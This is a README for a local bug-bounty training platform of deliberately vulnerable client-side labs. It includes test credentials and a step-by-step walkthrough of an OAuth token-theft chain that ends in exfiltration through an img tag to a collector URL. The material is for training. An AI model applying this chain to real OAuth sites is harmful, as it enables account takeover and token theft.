# ClientSide Academy

Client-side bug bounty training labs with real vulnerabilities inspired by published writeups.

## Quick Start

```bash
npm install
npm start
```

Open `http://localhost:3000`

## Test Accounts

| Username | Password | Role |
|----------|----------|------|
| victim | password123 | user |
| admin | admin123 | admin |
| attacker | hack3r | user |

## Structure

- `/` — Landing page
- `/dashboard` — Lab hub (40 challenges, progress tracking)
- `/writeups` — 12 writeup breakdowns with lab links
- `/labs/*` — Individual lab pages

## Lab Categories

| Category | Labs | Difficulty |
|----------|------|------------|
| DOM XSS | 5 | Easy → Hard |
| PostMessage | 4 | Easy → Hard |
| CSPT | 4 | Easy → Hard |
| OAuth | 3 | Medium → Expert |
| Advanced Sinks | 4 | Easy → Hard |
| CORS | 3 | Medium → Expert |
| Bug Chains | 7 | Hard → Expert |
| Capstone | 6 | Medium → Expert |
| Real-World | 4 | Hard → Expert |

## Real-World Labs (No Hints)

These look like real apps. You read the JS, find the bug, prove impact.

- **WorkHub** — window.open target hijacking (CTBB)
- **SecureVault** — CSPT in DELETE requests (Deepstrike)
- **CloudDocs** — PostMessage iframe attribute injection
- **Metrica** — DOM XSS source-to-sink hunt

## Tech

Node.js + Express. No build step.

- **Main app** &rarr; `http://localhost:3000`
- **OAuth IdP** (for multi-origin lab) &rarr; `http://localhost:4000`
- **Sandbox** (for multi-origin lab) &rarr; `http://localhost:5000`

All three are started by `npm start`. The extra ports are only used by the multi-origin Dirty Dancing chain lab.

## Multi-Origin Dirty Dancing Lab

A standalone chain lab at `/labs/chains/dd-multi-origin.html` that simulates a real OAuth token-theft chain across three origins.

### Architecture
```
localhost:3000  ── Main app (Dash SaaS + /dd/callback)
localhost:4000  ── OAuth IdP (separate cookie jar)
localhost:5000  ── Sandbox (analytics iframe origin, has XSS sink)
```

### Step-by-step exploit
1. **Sign into the IdP once**. Browse `http://localhost:4000/` and submit the form (`victim` / `password123`). This sets the SSO cookie on the :4000 origin, just like logging into Google once.
2. **Open the lab**: `http://localhost:3000/labs/chains/dd-multi-origin.html`.
3. **Inspect the attacker control panel** on the right &mdash; it shows the crafted OAuth URL and the JS that will be injected into the sandbox.
4. **Click "Fire exploit (open popup)"**. The lab does:
   - Opens `http://localhost:4000/authorize?response_type=token&redirect_uri=http://localhost:3000/dd/callback?state=bad_state&telemetry=<JS>` in a popup.
   - IdP sees the session cookie &rarr; auto-approves &rarr; redirects to `/dd/callback#access_token=eyJ...`.
   - The callback sees `state=bad_state` doesn't match what's expected. Shows an error. But **does not strip the fragment**.
   - The callback runs: `iframe.name = JSON.stringify({ href: location.href })` and `iframe.src = http://localhost:5000/embed?src=<attacker JS>`.
   - The sandbox reflects `src` into a `<script>` tag. Attacker's JS runs inside the iframe on `:5000`.
   - Attacker's JS reads its own `window.name` (which the parent just set) &mdash; the victim's full URL including the access token.
   - Exfils via `<img src="http://localhost:3000/dd/collect?data=...">` (cross-origin img tag, no CORS needed).
5. **Watch the "Attack log" and "STOLEN TOKEN" boxes** fill in.

### Why it works

- **Implicit OAuth flow** keeps the token in `location.hash` on the callback.
- **Callback doesn't clean the URL** when state validation fails.
- **`iframe.name` is a cross-origin channel**: what the parent sets becomes `window.name` inside the iframe.
- **Sandbox has an XSS sink**: `/embed?src=X` reflects X into `<script>X</script>`.
- **Attacker controls `?telemetry=`** which the main app pipes into the sandbox's `src` parameter.

No single bug is critical. Chained, they're zero-interaction account takeover.

### Reset between runs
Click "Clear collector" or navigate to the lab again &mdash; the lab auto-clears on load.
